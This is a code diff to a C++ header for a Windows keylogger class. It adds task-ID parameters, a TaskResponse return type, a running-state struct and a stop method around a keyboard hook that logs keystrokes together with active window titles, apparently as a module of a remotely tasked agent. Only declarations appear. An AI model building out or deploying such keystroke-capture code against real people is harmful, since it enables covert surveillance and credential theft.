@@ -31,11 +31,18 @@ SOFTWARE.
 
 #pragma comment(lib, "user32.lib")
 
+// Define a struct to hold the keylogger state
+struct KeyloggerState
+{
+    bool isRunning;
+    std::string data;
+};
+
 class Keylogger
 {
 public:
-    int keylog_start();
-    std::string get_keylog_data();
+    int keylog_start(const int &taskID);
+    TaskResponse<std::string> get_keylog_data(const int &taskID);
 
 private:
     static LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam);
@@ -53,6 +60,7 @@ private:
     void append_json_event(const std::string &type, const std::string &value,
                            const std::string &window);
     std::string get_active_window_title();
+    int keylog_stop();
 };
 
 #endif
